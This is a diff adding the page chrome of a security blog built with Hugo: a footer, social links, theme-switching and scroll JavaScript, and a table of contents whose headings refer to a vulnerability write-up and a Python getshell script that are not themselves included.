+                <a href="//zhihu.com/people/F0rmat" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="zhihu"><i><svg xmlns="http://www.w3.org/2000/svg" height="1em" viewBox="0 0 640 512"><style>svg{fill:#bac5d8}</style><path d="M170.54 148.13v217.54l23.43.01 7.71 26.37 42.01-26.37h49.53V148.13H170.54zm97.75 193.93h-27.94l-27.9 17.51-5.08-17.47-11.9-.04V171.75h72.82v170.31zm-118.46-94.39H97.5c1.74-27.1 2.2-51.59 2.2-73.46h51.16s1.97-22.56-8.58-22.31h-88.5c3.49-13.12 7.87-26.66 13.12-40.67 0 0-24.07 0-32.27 21.57-3.39 8.9-13.21 43.14-30.7 78.12 5.89-.64 25.37-1.18 36.84-22.21 2.11-5.89 2.51-6.66 5.14-14.53h28.87c0 10.5-1.2 66.88-1.68 73.44H20.83c-11.74 0-15.56 23.62-15.56 23.62h65.58C66.45 321.1 42.83 363.12 0 396.34c20.49 5.85 40.91-.93 51-9.9 0 0 22.98-20.9 35.59-69.25l53.96 64.94s7.91-26.89-1.24-39.99c-7.58-8.92-28.06-33.06-36.79-41.81L87.9 311.95c4.36-13.98 6.99-27.55 7.87-40.67h61.65s-.09-23.62-7.59-23.62v.01zm412.02-1.6c20.83-25.64 44.98-58.57 44.98-58.57s-18.65-14.8-27.38-4.06c-6 8.15-36.83 48.2-36.83 48.2l19.23 14.43zm-150.09-59.09c-9.01-8.25-25.91 2.13-25.91 2.13s39.52 55.04 41.12 57.45l19.46-13.73s-25.67-37.61-34.66-45.86h-.01zM640 258.35c-19.78 0-130.91.93-131.06.93v-101c4.81 0 12.42-.4 22.85-1.2 40.88-2.41 70.13-4 87.77-4.81 0 0 12.22-27.19-.59-33.44-3.07-1.18-23.17 4.58-23.17 4.58s-165.22 16.49-232.36 18.05c1.6 8.82 7.62 17.08 15.78 19.55 13.31 3.48 22.69 1.7 49.15.89 24.83-1.6 43.68-2.43 56.51-2.43v99.81H351.41s2.82 22.31 25.51 22.85h107.94v70.92c0 13.97-11.19 21.99-24.48 21.12-14.08.11-26.08-1.15-41.69-1.81 1.99 3.97 6.33 14.39 19.31 21.84 9.88 4.81 16.17 6.57 26.02 6.57 29.56 0 45.67-17.28 44.89-45.31v-73.32h122.36c9.68 0 8.7-23.78 8.7-23.78l.03-.01z"/></svg></i></a>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+                <a href="/atom.xml" class="hover:text-gray-900 dark:hover:text-gray-100 p-1 text-2xl" target="_blank" title="RSS"><i class="my-iconfont icon-feed"></i></a>
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    <div class="flex flex-col justify-between sticky top-0 pt-12 pb-4 -mt-10 text-gray-600 dark:text-gray-400">
+        <div class="bg-white shadow rounded p-4 mt-5 dark:bg-gray-800">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#漏洞详情">漏洞详情</a>
+      <ul>
+        <li><a href="#代码位置和代码">代码位置和代码</a></li>
+        <li><a href="#执行过程">执行过程</a>
+          <ul>
+            <li><a href="#payload代码">Payload代码</a></li>
+            <li><a href="#执行结果">执行结果</a></li>
+          </ul>
+        </li>
+        <li><a href="#分析过程">分析过程</a>
+          <ul>
+            <li><a href="#构造扩展名参数">构造扩展名参数</a></li>
+            <li><a href="#构造file参数">构造file参数</a></li>
+          </ul>
+    </li>
+    <li><a href="#用python写getshell脚本">用Python写Getshell脚本</a></li>
+    <li><a href="#结束">结束</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div>
+    </div>
+   
+</div> 
+
+    </div>
+    
+    
+<footer class="bg-white dark:bg-gray-800 border-gray-400 shadow mt-10">	
+    <div class="container  mx-auto flex py-8">
+        <div class="w-full text-center text-gray-600 dark:text-gray-400">
+            <p>
+                &copy; 2023 <a  class="text-gray-700 dark:text-gray-300 font-semibold" href="https://xxe.icu">F0rmat&#39;s Blog</a> By F0rmat 
+            </p>
+            
+            <p class="pt-1">
+                Powered by <a rel="nofollow noreferer noopener" href="https://gohugo.io/"  class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Hugo</a> 
+                Theme based on <a href="https://github.com/forecho/hugo-theme-echo" class="text-gray-700 dark:text-gray-300 font-semibold" target="_blank">Echo</a>
+            </p>
+
+            <span id="busuanzi_container">
+              访客数：<span id="busuanzi_value_site_uv"></span> | 访问量 <span id="busuanzi_value_site_pv"></span>
+            </span>
+
+        </div>
+
+    </div>
+    
+   
+    
+<script src="/js/clipboard.min.js"></script>
+   
+
+</footer>
+
+ <script>
+  window.onload = function() {
+    document.getElementById("nav-toggle").onclick = function() {
+      document.getElementById("nav-content").classList.toggle("hidden");
+    };
+
+    var donate = document.getElementById("btn-donate");
+    if (donate) {
+      donate.onclick = function() {
+        document.getElementById("donate-image").classList.remove("hidden");
+        donate.classList.add("hidden");
+      };
+    }
+
+    var hostname = window.location.hostname;
+    var divs = document.querySelectorAll('a[href^="http"]');
+    [].forEach.call(divs, function(div) {
+      url = div.getAttribute("href");
+      var domain = url
+        .replace("http://", "")
+        .replace("https://", "")
+        .split(/[/?#:]/)[0];
+      if (domain !== hostname) {
+        div.setAttribute("target", "_blank");
+      }
+    });
+  };
+
+   
+  
+  var h = document.documentElement,
+    b = document.body,
+    st = "scrollTop",
+    sh = "scrollHeight",
+    progress = document.querySelector("#progress"),
+    scroll;
+  var scrollpos = window.scrollY;
+  var header = document.getElementById("header");
+  var navcontent = document.getElementById("nav-content");
+
+  document.addEventListener("scroll", function() {
+     
+    scroll = ((h[st] || b[st]) / ((h[sh] || b[sh]) - h.clientHeight)) * 100;
+    progress.style.setProperty("--scroll", scroll + "%");
+
+     
+    scrollpos = window.scrollY;
+
+    if (scrollpos > 10) {
+      navcontent.classList.remove("bg-gray-100");
+    } else {
+      navcontent.classList.add("bg-gray-100");
+    }
+  });
+
+  
+  if (localStorage.theme === 'dark' || (!'theme' in localStorage && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+      var lightIcon = document.getElementById("light-icon");
+      var darkIcon = document.getElementById("dark-icon"); 
+      lightIcon.classList.add("hidden");
+      darkIcon.classList.remove("hidden");
+      document.querySelector('html').classList.add('dark')
+  }
+
+  document.getElementById('switchTheme').addEventListener('click', function() {
+    let htmlClasses = document.querySelector('html').classList;
+    var lightIcon = document.getElementById("light-icon");
+    var darkIcon = document.getElementById("dark-icon");
+    if(localStorage.theme == 'dark') {
+        htmlClasses.remove('dark');
+        localStorage.removeItem('theme');
+        darkIcon.classList.add("hidden");
+        lightIcon.classList.remove("hidden");
+    } else {
+        htmlClasses.add('dark');
+        lightIcon.classList.add("hidden");
+        darkIcon.classList.remove("hidden");
+        localStorage.theme = 'dark';
+    }
+  });
+</script>
+
+</body>
+
+</html>
